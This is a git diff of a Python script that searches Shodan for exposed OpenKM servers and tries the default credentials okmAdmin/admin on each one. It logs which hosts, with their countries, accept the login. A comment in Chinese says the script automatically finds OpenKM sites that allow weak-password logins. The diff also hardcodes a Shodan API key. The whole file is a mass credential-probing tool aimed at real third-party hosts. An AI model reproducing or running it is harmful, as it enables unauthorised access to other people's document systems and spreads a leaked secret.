@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 # coding=utf-8
 import shodan
 import requests
@@ -5,11 +6,6 @@ import logging
 
 USERNAME = 'okmAdmin'
 PASSWORD = 'admin'
-global count_success 
-global count_fail
-global success_list
-global fail_list
-global total
 
 def search_openkm(API_KEY):
 	logging.info("api key:" + API_KEY)
@@ -18,18 +14,19 @@ def search_openkm(API_KEY):
 	logging.debug(results)
 	logging.info(results['total'])
 	total = results['total']
-	iplist = []
-	for result in results['matches']: 
-		logging.debug(result)
-		#iplist.append({
-		#				"ip":result['ip_str'],
-		#				"port":result['port'],
-		#				})
-		url_str = str(result['ip_str']) + ':' + str(result['port'])
-		iplist.append(url_str)
-		logging.info(url_str)
 	logging.info("search finish!")
 #	return iplist
+	return results
+
+def deal_results(shodan_results):
+	results = []
+	for item in shodan_results['matches']: 
+		logging.debug(item)
+		url_str = str(item['ip_str']) + ':' + str(item['port'])
+		country_str = item['location']['country_name']
+		logging.info(url_str + '  ' + country_str)
+		results.append({'host':url_str,'country':country_str})
+	logging.debug(results)
 	return results
 
 def check_login(host):
@@ -54,29 +51,23 @@ def check_login(host):
 
 def main():
 	SHODAN_API_KEY = 'wKVILEwGhBalnpICFKwCzBblwLmYJe9R'
-	results = search_openkm(SHODAN_API_KEY)
-	#test host
-	#test_hosts = ['59.49.76.213:8001','59.120.19.158:8080']
-	#hosts = test_hosts
-	total = 0
-	count_success = 0
-	count_fail = 0
-	success_list = []
-	fail_list = []
+	summary = {'total':0,'success':0,'fail':0,'success_list':[],'fail_list':[]}
+	shodan_results = search_openkm(SHODAN_API_KEY)
+	summary['total'] = shodan_results['total']
+	results = deal_results(shodan_results)
 	for result in results:
+		host = result['host']
+		country = result['country']
 		if check_login(host):
-			success_list.append(host+'\n')
-			count_success += 1
-			total += 1
+			summary['success_list'].append(host + ' ' + country +'\n')
+			summary['success'] += 1
 		else:
-			fail_list.append(host+'\n')
-			count_fail += 1
-			total += 1
-	write_file(success_list,"success")
-	write_file(fail_list,"fail")
-	print("total:" + str(total) + " success:" + str(count_success))
-	logging.info(str(count_success) + '/' + str(total))
-
+			summary['fail_list'].append(host+'\n')
+			summary['fail'] += 1
+	write_file(summary['success_list'],"success")
+	write_file(summary['fail_list'],"fail")
+	print(str(summary['success']) + '/' + str(summary['total']))
+	#logging.info(str(count_success) +  + str(total))
 
 def write_file(list,file_name):
 	logging.info("write list :" + file_name)
@@ -89,6 +80,7 @@ def write_file(list,file_name):
 		file.close()
 
 if __name__ == '__main__':
+	#自动在shodan寻找openkm弱密码可以登录的域名
 	log_file = "./basic_logger.log"
 	logging.basicConfig(filename = log_file, level = logging.INFO)
 	logging.info("mission start!")
